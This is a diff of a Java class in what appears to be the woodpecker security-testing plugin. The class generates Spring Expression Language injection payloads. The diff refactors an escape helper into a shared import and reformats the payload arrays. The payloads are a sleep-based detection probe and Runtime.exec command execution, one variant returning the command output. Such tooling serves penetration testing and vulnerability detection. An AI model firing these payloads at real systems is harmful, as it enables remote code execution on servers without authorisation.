@@ -2,11 +2,9 @@ package me.gv7.woodpecker.plugin.exprs;
 
 import me.gv7.woodpecker.plugin.IExpr;
 
-public class SpELExpr implements IExpr {
-    private String escape(String payload) {
-        return payload.replace("'", "\\'");
-    }
+import static me.gv7.woodpecker.plugin.utils.Utils.escape;
 
+public class SpELExpr implements IExpr {
     @Override
     public String getName() {
         return "SpEL";
@@ -27,16 +25,22 @@ public class SpELExpr implements IExpr {
 
     @Override
     public String[] genSleep(int sec) {
-        return new String[]{"#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}"};
+        return new String[]{
+                "#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}"
+        };
     }
 
     @Override
     public String[] genExec(String command) {
-        return new String[]{"#{T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "')}"};
+        return new String[]{
+                "#{T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "')}"
+        };
     }
 
     @Override
     public String[] genExecWithEcho(String command) {
-        return new String[]{"#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "').getInputStream()).useDelimiter('/').next()}"};
+        return new String[]{
+                "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "').getInputStream()).useDelimiter('/').next()}"
+        };
     }
 }
